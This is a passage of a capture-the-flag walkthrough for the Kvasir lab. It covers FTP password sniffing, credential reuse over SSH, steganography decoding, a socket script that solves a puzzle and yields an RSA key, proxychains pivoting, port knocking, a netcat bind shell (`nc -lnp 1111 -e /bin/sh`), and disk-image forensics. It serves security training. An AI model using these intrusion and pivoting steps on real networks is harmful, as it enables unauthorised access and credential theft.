+<p>I changed the command to add the <code>-X</code> flag as this looked like FTP traffic flowing over the interface (you haven&rsquo;t forgotten the ftp server yet have you?).</p>
+
+<pre><code class="language-bash">13:25:01.387981 IP 192.168.3.200.ftp &gt; 192.168.3.40.36437: Flags [P.], seq 321:359, ack 13, win 453, options [nop,nop,TS val 13182840 ecr 13182839], length 38
+    0x0000:  4510 005a 7e22 4000 4006 342b c0a8 03c8  E..Z~&quot;@.@.4+....
+    0x0010:  c0a8 0328 0015 8e55 1bf0 5a96 015a 5499  ...(...U..Z..ZT.
+    0x0020:  8018 01c5 42a1 0000 0101 080a 00c9 2778  ....B.........'x
+    0x0030:  00c9 2777 3333 3120 5573 6572 2063 656c  ..'w331.User.cel
+    0x0040:  6573 204f 4b2e 2050 6173 7377 6f72 6420  es.OK..Password.
+    0x0050:  7265 7175 6972 6564 0d0a                 required..
+
+13:25:01.388050 IP 192.168.3.40.36437 &gt; 192.168.3.200.ftp: Flags [P.], seq 13:32, ack 359, win 490, options [nop,nop,TS val 13182840 ecr 13182840], length 19
+    0x0000:  4500 0047 73fe 4000 4006 3e72 c0a8 0328  E..Gs.@.@.&gt;r...(
+    0x0010:  c0a8 03c8 8e55 0015 015a 5499 1bf0 5abc  .....U...ZT...Z.
+    0x0020:  8018 01ea a5ae 0000 0101 080a 00c9 2778  ..............'x
+    0x0030:  00c9 2778 5041 5353 2069 6d32 3242 4634  ..'xPASS.im22BF4
+    0x0040:  4858 6e30 310d 0a                        HXn01..
+
+</code></pre>
+
+<p>A cleartext username and password? Well aint that just handy! :D Just to confirm I wrote a pcap to disk with the <code>-W</code> flag, transferred it to my attacking machine and opened it in Wireshark so that I can inspect the whole FTP conversation.</p>
+
+<p>{% img <a href="https://i.imgur.com/YiwWzsy.png">https://i.imgur.com/YiwWzsy.png</a> %}</p>
+
+<p>It seems like <code>celes</code> is simply logging in, getting a directory listing, and logging out.</p>
+
+<p>Taking a long shot, I wondered if the age old problem of password reuse is applicable here, so I tried to ssh in to <strong>192.168.3.40</strong> (the ip the FTP conversation was coming from) using <code>celes:im22BF4HXn01</code>:</p>
+
+<pre><code class="language-bash">root@db:~# ssh celes@192.168.3.40
+celes@192.168.3.40's password: # entered im22BF4HXn01
+Linux dev1 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have mail.
+Last login: Thu Sep  4 09:20:00 2014
+celes@dev1:~$
+</code></pre>
+
+<p>##finding terras secret
+Ok lets take a moment and make sure I know where I am in the network. The newly accessed server is denoted in red:</p>
+
+<p>{% img <a href="https://i.imgur.com/nXpoEBM.png">https://i.imgur.com/nXpoEBM.png</a> %}</p>
+
+<p>I don’t have connectivity directly to <strong>192.168.3.40</strong> at the moment, but if I really need that I can arrange it. For now, lets see what we have on <code>dev1</code>.</p>
+
+<p>First, I find the sneaky ftp session script <code>getLogs.py</code>, that does exactly that which I saw in the packet captures. Next, I find a message in <code>celes</code> mailbox:</p>
+
+<pre><code class="language-bash">celes@dev1:~$ cat /var/spool/mail/celes 
+Return-path: &lt;celes@localhost&gt;
+Received: from celes by localhost with local (Exim 4.80)
+    (envelope-from &lt;celes@localhost&gt;)
+    id 1XHczw-0000V2-8y
+    for celes@127.0.0.1; Wed, 13 Aug 2014 19:10:08 +0100
+Date: Wed, 13 Aug 2014 19:10:08 +0100
+To: celes@127.0.0.1
+Subject: Reminder
+User-Agent: Heirloom mailx 12.5 6/20/10
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Message-Id: &lt;E1XHczw-0000V2-8y@localhost&gt;
+From: celes@localhost
+
+Terra sent me kvasir.png and challenged me to solve the stupid little puzzle she has running on her machine... *sigh*
+</code></pre>
+
+<p>The message reveals that Terra has a puzzle on her machine (<strong>192.168.3.50</strong> from <code>/etc/hosts</code> on the <code>db</code> server?). She also mentions <code>kvasir.png</code>, which happens to be in <code>celese</code> home directory:</p>
+
+<pre><code class="language-bash">celes@dev1:~$ ls -lah kvasir.png 
+-rw-r--r-- 1 celes celes 103K Sep  3 22:16 kvasir.png
+</code></pre>
+
+<p>Lastly, the <code>.bash_history</code> for <code>celese</code> has a entry <code>stepic --help</code>. <code>stepic</code> is a steganography tool. So, it seemed pretty clear what needs to be done here. My guess was that kvasir.png has a piece of the puzzle that is on Terra&rsquo;s machine. So, I converted the <code>kvasir.png</code> image to hex, and copy pasted the output on my attacking machine into a text file and converted it back to a image using <code>xxd -r -p kvasir.png.xxd &gt; kvasir.png</code>.</p>
+
+<p>{% img <a href="https://i.imgur.com/DKIbriL.png">https://i.imgur.com/DKIbriL.png</a> %}</p>
+
+<p>###getting stepic to play nice
+With the image ready, I searched for <code>stepic</code> using <code>pip</code> in my virtual env and installed it:</p>
+
+<pre><code class="language-bash">(kvasir)root@kali:~# pip install stepic
+Downloading/unpacking stepic
+  Downloading stepic-0.4%7ebzr.tar.gz
+  Running setup.py egg_info for package stepic
+    
+Installing collected packages: stepic
+  Running setup.py install for stepic
+    changing mode of build/scripts-2.7/stepic from 644 to 755
+    
+    changing mode of /root/kvasir/bin/stepic to 755
+Successfully installed stepic
+Cleaning up...
+</code></pre>
+
+<p>However, <code>stepic</code> was not just a case of plug and play for me. <strong>NOPE</strong>:</p>
+
+<pre><code class="language-bash">(kvasir)root@kali:~# stepic 
+Traceback (most recent call last):
+  File &quot;/root/kvasir/bin/stepic&quot;, line 24, in &lt;module&gt;
+    import Image
+ImportError: No module named Image
+</code></pre>
+
+<p>Long story short, a small hack and installation of another dependency finally got it working for me:</p>
+
+<pre><code class="language-bash">(kvasir)root@kali:~# pip install pillow
+Downloading/unpacking pillow
+  Downloading Pillow-2.6.1.tar.gz (7.3Mb): 7.3Mb downloaded
+  Running setup.py egg_info for package pillow
+    Single threaded build, not installing mp_compile: 1 processes
+
+[... snip ...]
+
+    *** OPENJPEG (JPEG2000) support not available
+    --- ZLIB (PNG/ZIP) support available
+
+[... snip ...]
+
+Successfully installed pillow
+Cleaning up...
+</code></pre>
+
+<p>The final hack was to change the installed <code>stepic</code> bin at <code>/root/kvasir/bin/stepic</code> line 24 from <code>import Image</code> to <code>from PIL import Image</code>. Finally, <code>stepic</code> was working fine.</p>
+
+<p>###finding the secret
+With <code>stepic</code> up and running, I was finally able to run it against the image <code>kvasir.png</code>:</p>
+
+<pre><code class="language-bash">(kvasir)root@kali:~# stepic --decode --image-in=kvasir.png --out=out
+
+# check the file type we got out
+root@kali:~# file out
+out: ASCII text, with very long lines, with no line terminators
+
+# check the output we got
+root@kali:~# cat out
+89504e470d0a1a0a0000000d494844520000012200000122010300000067704df500000006504c5
+445ffffff00000055c2d37e00000104494441540899ed98c90dc32010459152804b72eb2ec90544
+22304bc089655f180ec9fb0730f07cfa9a0552420821f43fcaa6674aeb5e96dbe23b1b5434a58be
+559bf1e59befa03a848aa5ab22de690f2d530a8895473086a365500e7a1265132b5b3bbfc05358e
+7a57640b919bba0d358eeab55c9c418da7cc0df1a576a2792fa561ad035434a5920b808588d974e
+215d4584acff4065626ffe9db47a8e194eec805a00d7621830aa6acffd40c95d5a6fa27d404cae5
+55e13475410550e6cca113ed72145424a56ee8ab4f8989ecb5196a02d5bdfa2477e83333410553d
+97ba093cc04154c89a439ba880ea881944c2d3aea0a6a0e75acc8528c4550e1144208a15fd70b88
+df9bb4ae0a3dc20000000049454e44ae426082
+</code></pre>
+
+<p>At this stage I was pretty convinced my hacks to get <code>stepic</code> to work failed. I am also not really sure what to expect as output so that made it even harder to know if I had something to work with there.</p>
+
+<p>Close study of the output string though got me started in trying to determine what this was that I had. My method involved me invoking a python shell and trying a bunch of <code>decode()</code> methods on it. I just took the first few characters of the output to play with as some decodings need specific string lengths etc:</p>
+
+<pre><code class="language-bash">root@kali:~# python
+Python 2.7.3 (default, Mar 14 2014, 11:57:14) 
+[GCC 4.7.2] on linux2
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&gt;&gt;&gt; &quot;89504e470d0a1a0a000000&quot;.decode(&quot;hex&quot;)
+'\x89PNG\r\n\x1a\n\x00\x00\x00'
+&gt;&gt;&gt;
+</code></pre>
+
+<p>Decoding it as <code>hex</code> revealed the part I needed to see&hellip; <code>PNG</code>! So this string was a hex encoded PNG image (unless thats a troll too&hellip;). I took <code>out</code> and reversed it using <code>xxd -r -p</code>:</p>
+
+<pre><code class="language-bash">root@kali:~# xxd -p -r out &gt; kvasir2.png 
+root@kali:~# file kvasir2.png 
+kvasir2.png: PNG image data, 290 x 290, 1-bit colormap, non-interlaced
+</code></pre>
+
+<p>Lets see what the image looks like:</p>
+
+<p>{% img <a href="https://i.imgur.com/r0wxCYh.png">https://i.imgur.com/r0wxCYh.png</a> %}</p>
+
+<p>A QR code! I fetched my phone and scanned it, revealing the string <code>Nk9yY31hva8q</code>. Great!&hellip; I think. Wait, what does this even mean? I got stumped again into wondering what this arb string is for that I have. It was not the root password for <code>dev1</code> either.</p>
+
+<p>##playing Terra&rsquo;s game
+Without being able to place the string found in the QR code, I stepped one step back and decided to check out Terra&rsquo;s game as per the email. From the <code>/etc/hosts</code> on <code>db</code>, I saw a comment for <code>terra</code> as <strong>192.168.3.50</strong>. Using the SSH socks proxy on <code>tcp/8000</code> I setup when I setup the SSH session to <strong>192.168.2.200</strong>, I nmapped <strong>192.168.3.50</strong>.</p>
+
+<pre><code class="language-bash"># /etc/proxychains.conf has line
+# socks5    127.0.0.1 8000
+
+# scans will appear to be coming from 192.168.3.200 for
+# 192.168.3.50
+root@kali:~# proxychains nmap -sT 192.168.3.50
+ProxyChains-3.1 (http://proxychains.sf.net)
+
+Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 16:31 SAST
+Nmap scan report for 192.168.3.50
+Host is up (0.0012s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+4444/tcp open  krb524
+
+Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
+</code></pre>
+
+<p>Well <code>tcp/4444</code> looks interesting! Lets have a look!</p>
+
+<pre><code class="language-bash">root@kali:~# proxychains nc 192.168.3.50 4444
+ProxyChains-3.1 (http://proxychains.sf.net)
+Hello Celes &amp; Welcome to the Jumble!
+
+Solve:indrssoses 
+Solve:roneb bob
+Solve:abaerrbs 
+
+[... snip ...]
+
+Solve:iepasncm 
+
+Score: 0
+Time: 22.71 secs
+Just a bit embarrasing really...
+</code></pre>
+
+<p>Don&rsquo;t think I did too well there! :D Not to fear. I recognized some of the strings after the <em>Solve:</em> as ones that are scrambled from the previously found <code>.words.txt</code> file. So, my guess here was that I had to write a small script that will connect to the socket and answer with the unscrambled versions from <code>.words.txt</code>. With the <code>.words.txt</code> file locally available, I slapped together something to try and do this:</p>
+
+<pre><code class="language-python">#!/usr/bin/python
+
+# Kvasir Terra Puzzle Solver
+
+import sys
+import socket
+import base64
+
+# read the words.txt we got into a list
+with open('words.txt') as f:
+    words = f.read().splitlines()
+
+# connection to the game
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(('192.168.3.50', 4444))
+
+# start processing the lines
+while True:
+
+    # receive a frame large enough
+    frame = sock.recv(150)
+
+    # check that its a question frame
+    if 'Solve' not in frame:
+        print &quot;[!] 'Solve' not in frame. Game over?&quot;
+        break
+
+    # split the frame with :
+    frame = frame.split(':')
+    if len(frame) &lt; 2:
+        print &quot;[!] Was unable to split by :. Game over?&quot;
+        break
+    
+    question = frame[1].strip()
+
+    # @barrebas suggested a length check too to increase probability :)
+    result = [s for s in words if not s.strip(question) and len(question) == len(s)]
+    #result = [s for s in words if not s.strip(question)]
+
+    if len(result) &lt; 1:
+        print &quot;[!] Was unable to match anything to %s&quot; % question
+        continue
+
+    answer = result[0].strip()
+ 
+    print &quot;[+] Matched %s to %s&quot; % (question, answer)
+    sock.send(answer)
+
+# did we win? \:D/
+if 'You\'re a winner' in frame:
+    print &quot;[+] We won!&quot;
+
+    # read the rest of the socket output
+    frame += sock.recv(2500)
+
+    # base64 decode the last string
+    print &quot;[+] Extracing and decoding the base64 section&quot;
+    print base64.b64decode(frame.split('\n')[-1])
+    sys.exit(0)
+
+sock.close
+
+# work with what we have left
+print &quot;[+] Last frame was:\n %s&quot; % frame
+print &quot;[+] Done&quot;
+sys.exit(0)
+</code></pre>
+
+<p>Once you are able to get a score of 120 it seems, you are considered a winner. Once you have won, a fairly large string is output again. This string appeared to be a base64 encoded string, and as a result, I added the <code>base64.b64decode(frame.split('\n')[-1])</code> section to the script so that if you win it will print the cleartext version.</p>
+
+<p>The script is not perfect. Sometimes you don’t get 120 as a score and have to run it again. But, within a reasonable amount of attempts you are able to beat the game. A sample run would be:</p>
+
+<pre><code class="language-bash">root@kali:~# proxychains ./play.py 
+ProxyChains-3.1 (http://proxychains.sf.net)
+[+] Matched atravdeii to radiative
+[+] Matched oilyaerbdmpn to imponderably
+
+[... snip ...]
+[+] Matched idmlhkeir to kriemhild
+[!] 'Solve' not in frame. Game over?
+[+] We won!
+[+] Extracing and decoding the base64 section
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,76841822AB9E772FD1D653F6179F0E4D
+
+OrEM2ocnhHKg5nuH7ps1CoOJCihasmFJKLOVNNYFOhGKUojPYEta5yOhIskf0h0r
+So+xVDK67G3DlgymUV3DxGfizLfZvhxQRC8Qy0mf4N+miYkvf2NaFtatpNcjK5pM
+Uy6QSFMOC8aKpe0FL6UGDRJQ5GSG4DlJrLUJBMvnSLtYZHlaWAICKbXfpXV4STwv
+J0D8h9RtlRJhLCK5eKgupYCQIiGQWg3PvZpXk9kkjXhmOQwUYoCRl3l4j5zlnFcT
+P6U9UPhRq/Ck4Qrk2dGxFfppQd9xW+b4PWjiSCikLF3Q0hfNNvEbu4ounAgYwPFH
+jOXHJqxVog/pZz9Y8XfSP3hz9AYHWfI2iC9Cnk7boRcOv+mcgEeWWkYrVscOivYj
+9N2xiNp4GH+NIG8mm/Ldl7jQMl/Vrr5cx3fXjOezmgsSkAY4CcspwKsSXK8GL/bO
+hT6pKWfL6UI8wUgpI7KhgK+AOKuS/XPYTSdz+0RJxNFSLOFNcjRtL+NW0UjPq5Jh
+Dia+pw5qB+lllxgaN0WBQskIFQpppPowwjG8Jg8jJBjSYj3r4LIrZwJSpcvoBiUA
+oCqnQUMtXlMh9/CvBBGs1+JVcjkInBde945V+ejhP6GPYju4TQV7B70d7aEW0OEm
+0d7nrOW/LCYpsV/N5rqVsGlTvwjJNowyMqEZ9E09guM5eL4CEPPmp9ZDey2fBAGw
+q7nSr8q6Hsf4d+YPR+90EfMJReqI3s1FQoTvx+PaFPiKw7dfHFCgLscXcXcognLz
+cB0lnemI+cFmfY74F1eYL3fwJIwSRgK85Xc2My8sqJz1izj6IlO2kQ1jLkrhJOZ8
+X+p/9w5zA0x2fbjppHac+YoJfyPyYXjkpigDPjHXhRit2qnUrHfDc0Fjh5AKNU2K
+MU/ywXGEg6w0CppK9JBo0u/xJlhT/jOWNiM4YZjXlhQzkxyebvbyRS6Slhlo142l
+gMuMUvPn1fAenir6AFwy2rlktQ5/a8z2VCwPkNA40MImSHMWRSFboDjM5zwr24Gk
+N0pI1BCmCsf0msvEwLhdcVnhJY7Bg4izm5bX+ArV/ymLOkybK8chz5fryXcjeV1q
+izJe2AXZk1/8hY80tvJWjxUEfnguyoozQf5T74mn5aez9JgGWMqzpfKwZ6Lx5cTg
+Zu+m+ryakBPFjUtt04lCYCCKWQzPhgIr5xUFx62hCGhh6W8tSIB6k7Hpun123GQ0
+uT+R0ErYA5Gdyx44FZEatZ3rXCpVmJllCTWUqBuaHYAtcZThTTZfxRFHy02IT6FW
+PLCZ/XN2E+TdtkXmFcTXRsgtyA/5VXsTWWmRcHczv5g5YcQ3pHs3MhSxsWSdTz/8
+RYzmxOnCjZWXaUe0Xb7FjA/evmpXsyhChGbvp0K0hZFcMeszFKa8K4pAedcyG31n
+4+HhImnEpLZQOXhfXlkKMQXrBys7hkonkDp57Vqh+IIZLGzVmfTVEj2Whc/0Y+GI
+DMph0ZvTG+Jgv1LO3Sl82Rzm1jUkzEIZNIxYeSGrZf6ChVLPa85axqw5EVNCxYUg
+JAqg+ud6xIO9obidxzI2rLfbxcpMur80nb4crYMNm09yPQaskngK/4IjmnPLeTih
+-----END RSA PRIVATE KEY-----
+</code></pre>
+
+<p>A private key? Encrypted though :( Remembering the string I got from the QR code earlier that had no affiliation to anything yet, I tried that as the password to decrypt:</p>
+
+<pre><code class="language-bash">root@kali:# openssl rsa -in terra_key -out terra_key_nopass
+Enter pass phrase for terra_key: # entered Nk9yY31hva8q
+writing RSA key
+
+root@kali:~# cat terra_key_nopass 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAyekXwhcscSSzT3vw5/eL2h1Bb55vEIOOAkQpIQQ/ldnyT6Yt
+w0dAaN71JidjfojzvdaZRNrRY5wkdHUr2t93TJx8vKDZ+n5up4nCKle3p2sz2hKP
+DhP7LvxkVTM7Io3qoAYXefggTOWvfoK8X8pXE3xAdIyF4uCXmDjeg6UKoCr5XiWP
+12YQEODLd+tp9RH4R/rCaencsNsta45sY1NXtWuJje4HVkPV8ei04ce8SP5PwVhV
+sfp2Hxr8g4IKn7ZTwtmkD1SuvmZoyDHNAsToqFt2RiVE9yLQj94Gcagx7PqUijeH
+b+4T+6tuDZtjgct4RdYZejnUOYx+iHiSjl6xCQIDAQABAoIBADYOi+fQ4HsiQkeD
+fUn9gpnQv1Ys6rtXHUwKB6DpTETIZxFgAlyH1Py+xI+EeCTGcctfiwVeODUc9r2f
+KTCeJ4iBVPwDbJieBO4h+bPwbCEMmINH+LjiLJu1wv70il6D9E8Hkn17Ktqrm8KZ
+KenTeGClIXSSsr29N5jvkNNZ+nBK116l2TNNSsiWGc3VnezgCuRnDMSuKmA4P/OD
+5F/h2/1sC33P1P5zxSMMsUZbm616AXNdv2DxHYm5b7p0L3/wzpZaJ+ZCp9jutbMO
+P7XADZrFSn1EOk9blfVQz77GhRUVAotXKv7Jj4x+zHjq2l3n2Jk5RwJLl8iw4vZ+
+ActgrskCgYEA5RhweA1naUanRJtlnLY4ywjfpZffPOZovmthqeOYdSJmwdmKvf08
+bBR7hRwwlwgD92jeZWC1nK2zjwVpVQqV3sq4+x6Yspp0T5d9hp7PqUvPGglRdPXX
+JQjMBV/Q2fK+ydnTz3xImjIvGsoFya9B/COKicu5ugCklCxtdNPJd/8CgYEA4Z9c
+cekfgeha7sYe202krz0m03b8IqFaEMBUkEDmr8+RTL2H+9ciu3/2y/0UJ20w3qwe
+gWv2OvOmumJ2wi/HVQdoQ9purzKWDdes6QrQsZ6+4eeylQmVmBSOF9YiVudSwyBM
++2rmE4m4qAIVidIJskb6DpB+fxDU1iWFLHlUFvcCgYEArxV8buOfkp+CmjZA9AF3
+agQAGCf3Xi2hA1ZBr3rXOz3tVl0RYZ21ncwRkms231Yq4dxtiwDcCz/dKIK0O1/5
+pek8cf6yKF1OYr2eG1In1nSvdHCGpmJz6EPO2JSfotGX6d/ltn5/ZgjQYyLeRYMB
+ZNcsu57M9FAld3B0voJVSLUCgYACac72VPUGUbLvTOU1mU4CpdfNeT9XK3yoIzaE
+WH1fMgwu0vQqaHGxqbu9ENbvWQalyxeEcOAwXzzQT49Pom0yZqLh3utCKntaaI0r
+7Pawf68xAWZym6ii+M1QSfUSEuVauvS317vgR5/XBDaww7Ng2cuA7mC8ATUVmU8k
+W6PfnwKBgQCBapB8OxxeRoFlnctafkTqtlNU5MGgiUGCCk/NNpDJhzaBuSdxdbRB
+bQ6OJjQ9fbjF24w1iOJCGTtMQ0fxer7oxoM8TblM/eYx3Dg6MwsVApP75VdqzSas
+mlJnXivwgJkeju+L42BMEl4UaxuhFPBSNCmlLBPj3Hdgyh5LSyIKmw==
+-----END RSA PRIVATE KEY-----
+</code></pre>
+
+<p>Considering that <strong>192.168.3.50</strong> was named as <code>terra</code> in that <code>/etc/hosts</code> file, I attempted authentication using this key on it:</p>
+
+<pre><code class="language-bash">root@kali:~# proxychains ssh -D 8001 terra@192.168.3.50 -i terra_key_nopass 
+ProxyChains-3.1 (http://proxychains.sf.net)
+Linux dev2 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have mail.
+Last login: Sun Nov  9 07:13:31 2014 from 192.168.3.200
+terra@dev2:~$
+</code></pre>
+
+<p>As you can see, I also opened another socks proxy locally on port <code>tcp/8001</code> in the case for any further pivoting needs. Again, to make sure we understand where in the network we are, consider the following diagram, with the path to <code>dev2</code> in red:</p>
+
+<p>{% img <a href="https://i.imgur.com/Pt8SFVJ.png">https://i.imgur.com/Pt8SFVJ.png</a> %}</p>
+
+<p>##letting myself in via the back door
+Enumerating <code>dev2</code> did not reveal much interesting information. In fact, the most important clue found was in a mail for <code>terra</code> from Locke:</p>
+
+<pre><code class="language-bash">terra@dev2:~$ cat /var/spool/mail/terra 
+Return-path: &lt;locke@192.168.4.100&gt;
+Received: from locke by 192.168.4.100 with local (Exim 4.80)
+~       (envelope-from &lt;locke@adm&gt;)
+~       id 1XHczw-0000V2-8y
+~       for terra@192.168.3.50; Wed, 13 Aug 2014 19:10:08 +0100
+
+Date: Wed, 13 Aug 2014 19:10:08 +0100
+To: terra@192.168.3.50
+Subject: Port Knock
+User-Agent: Heirloom mailx 12.5 6/20/10
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Message-Id: &lt;E1XHczw-0000V2-8y@adm&gt;
+From: locke@192.168.4.100
+~
+Hi Terra,
+
+I've been playing with a port knocking daemon on my PC - see if you can use that to get a shell.
+Let me know how it goes.
+
+Regards,
+Locke
+</code></pre>
+
+<p>Port knocking daemon eh? Admittedly at this stage again I was kinda stuck. Did I miss the sequence to knock on my way here? While wondering about this, I setup to run a port scan on <strong>192.168.4.100</strong></p>
+
+<pre><code class="language-bash"># /etc/proxychains.conf has line
+# socks5    127.0.0.1 8001
+
+# scans will appear to be coming from 192.168.4.50 for
+# 192.168.4.100
+root@kali:~# proxychains nmap -sT 192.168.4.100
+ProxyChains-3.1 (http://proxychains.sf.net)
+
+Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 17:39 SAST
+Nmap scan report for 192.168.4.100
+Host is up (0.0018s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap done: 1 IP address (1 host up) scanned in 1.75 seconds
+</code></pre>
+
+<p>Only <code>tcp/22</code>. :s</p>
+
+<p>I started working back a little bit to some of the previous machines in search for clues, but, found nothing concrete. Remembering the port knocking daemon used in <a href="http://vulnhub.com/entry/knock-knock-11,105/">Knock Knock</a> (<code>knockd</code>), I went and searched for its configuration file, looking for the default port sequence it is configured with. I found the config file <a href="https://github.com/jvinet/knock/blob/master/knockd.conf">here</a>, which revealed the default sequence of: <code>7000,8000,9000</code>. So, I tested this by attempting to connect with <code>nc</code> to these ports on <strong>192.168.4.100</strong>, and following up with a nmap:</p>
+
+<pre><code class="language-bash">terra@dev2:~$ nc -v 192.168.4.100 7000 -w 1; nc -v 192.168.4.100 8000 -w 1; nc -v 192.168.4.100 9000 -w 1
+192.168.4.100: inverse host lookup failed: Host name lookup failure
+(UNKNOWN) [192.168.4.100] 7000 (afs3-fileserver) : Connection refused
+192.168.4.100: inverse host lookup failed: Host name lookup failure
+(UNKNOWN) [192.168.4.100] 8000 (?) : Connection refused
+192.168.4.100: inverse host lookup failed: Host name lookup failure
+(UNKNOWN) [192.168.4.100] 9000 (?) : Connection refused
+terra@dev2:~$
+</code></pre>
+
+<p>The nmap after the knock:</p>
+
+<pre><code class="language-bash">root@kali:~# proxychains nmap -sT 192.168.4.100
+ProxyChains-3.1 (http://proxychains.sf.net)
+
+Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 17:45 SAST
+Nmap scan report for 192.168.4.100
+Host is up (0.0015s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+1111/tcp open  lmsocialserver
+
+Nmap done: 1 IP address (1 host up) scanned in 1.71 seconds
+
+</code></pre>
+
+<p>A new port! <code>tcp/1111</code> :) Lets check it out.</p>
+
+<pre><code class="language-bash">root@kali:~# proxychains nc 192.168.4.100 1111
+ProxyChains-3.1 (http://proxychains.sf.net)
+
+# a new connection has no output. Only after typing
+# 'crap' do you realise you have a sh session open
+  
+id
+uid=1000(locke) gid=1000(locke) groups=1000(locke)
+</code></pre>
+
+<p>Shell access as <code>locke</code> on <strong>192.168.4.100</strong>. Nice :D To help me ensure I can comprehend where I am in the network, consider the following diagram, which is turning into a mess thanks to how deep this whole is&hellip; The new connection denoted in red again:</p>
+
+<p>{% img <a href="https://i.imgur.com/u2klDxc.png">https://i.imgur.com/u2klDxc.png</a> %}</p>
+
+<p>##busting kefka
+The shell on <code>adm</code> as <code>locke</code> was nothing more than a <code>/bin/sh</code> instance executed over <code>netcat</code>. This can be seen in the <code>littleShell.sh</code> file in <code>/home/locke</code>:</p>
+
+<pre><code class="language-bash">cat littleShell.sh
+#!/bin/sh
+
+/bin/nc -lnp 1111 -e '/bin/sh'
+</code></pre>
+
+<p>Other interesting files were all in <code>locke</code>&rsquo;s home directory:</p>
+
+<pre><code class="language-bash">pwd
+/home/locke
+ls -lh
+total 332K
+-rw-r--r-- 1 locke locke 322K Aug 10 10:32 diskimage.tar.gz
+-rwxr--r-- 1 locke locke   42 Aug 13 17:59 littleShell.sh
+-rw-r--r-- 1 locke locke  110 Sep  4 13:38 note.txt
+</code></pre>
+
+<p>The <code>note.txt</code> file:</p>
+
+<pre><code class="language-bash">cat note.txt
+Looks like Kefka may have been abusing our removable media policy.  I've extracted this image to have a look.
+</code></pre>
+
+<p>Awesome. That gives me a pretty clear idea of where this may be going. My guess was I needed to find something interesting in the <code>diskimage.tar.gz</code> file to progress. The first thing I had to do was get a local copy of <code>diskimage.tar.gz</code>. Out comes <code>netcat</code> again :) I hosted the file on <code>tcp/4444</code> on <strong>192.168.4.100</strong> with <code>nc -lvp 4444 &lt; diskimage.tar.gz | xxd -p</code>. I then read the file on my attacking machine with <code>timeout 5 proxychains nc 192.168.4.100 4444 &gt; diskimage.tar.gz</code> (I gave the file 5 seconds to come over before killing the connection, allowing my other netcat shell to stay alive).</p>
+
+<p>I had to carve out the string <em>ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)</em> out of the archive I get locally on disk due to the proxychains command adding this. Luckily it was a simple <code>dd</code> on the top line and it was gone :)</p>
+
+<p>I then extracted the archive and ran the resultant archive through <code>file</code>:</p>
+
+<pre><code class="language-bash">root@kali:~# tar xvf diskimage.tar.gz 
+diskimage
+
+root@kali:~# file -k diskimage
+diskimage: x86 boot sector, code offset 0x3c, OEM-ID &quot;MSDOS5.0&quot;, sectors/cluster 2, root entries 512, Media descriptor 0xf8, sectors/FAT 238, heads 255, hidden sectors 63, sectors 122031 (volumes &gt; 32 MB) , reserved 0x1, serial number 0xad6f8bf, unlabeled, FAT (16 bit) DOS executable (COM), boot code
+</code></pre>
+
+<p>Ok, so this really looks like a disk image. I decided to mount it and have a look inside:</p>
+
+<pre><code class="language-bash">root@kali:~# mount diskimage /mnt/
+
+root@kali:~# ls -lah /mnt/
+total 21K
+drwxr-xr-x  2 root root  16K Jan  1  1970 .
+drwxr-xr-x 23 root root 4.0K Sep 17 13:04 ..
+-rwxr-xr-x  1 root root  118 Aug  3 12:10 Secret.rar
+
+# oh! a .rar? Lets extract...
+root@kali:~# unrar x /mnt/Secret.rar
+
+UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal
+
+
+Extracting from /mnt/Secret.rar
+
+Enter password (will not be echoed) for MyPassword.txt: 
+
+No files to extract
+</code></pre>
+
+<p>A <code>.rar</code> archive, but no password to extract. Aaaand again, I was stuck. My guess was there was some forensics aspect to this, and that the disk image may be more than just a disk image&hellip;</p>
+
+<p>Some googling around got me a hit on a tool called <code>autopsy</code>, which is a disk image analysis framework. I cared little for the case files features and what not, but much rather the actual analysis features. I fired up the tool from the Kali menu, and browsed to the web interface. I had a whole bunch of prompts to work through, and eventually came to a view that allowed me to inspect the disk:</p>
+
+<p>{% img <a href="https://i.imgur.com/SBIbnMU.png">https://i.imgur.com/SBIbnMU.png</a> %}</p>
+
+<p><code>C:/Funky.wav</code>. Now that is not something I saw when I had the disk mounted :D. I downloaded the file via the <em>Export</em> link, copied it to my laptop (my Kali doesnt have sound for whatever reason) and fired up the speakers to have a listen.</p>
+
+<p>It sounded like this:</p>
+
+<p>{% img <a href="https://i.imgur.com/IbdKBKR.gif">https://i.imgur.com/IbdKBKR.gif</a> %}</p>
+
+<p>Yeah, I don&rsquo;t get it either. I was stumped for a few minutes again, until I remembered <a href="http://vulnhub.com/entry/xerxes-201,97/">Xerxes2</a>, which has a similar strange sounding file, but with a hidden message viewable via a spectrogram generated by <a href="http://www.sonicvisualiser.org/index.html">Sonic Visualizer</a>. I downloaded the app, loaded the wav file and got the spectrogram to do its thing:</p>
+
+<p>{% img <a href="https://i.imgur.com/7bxW0Xc.png">https://i.imgur.com/7bxW0Xc.png</a> %}</p>
+
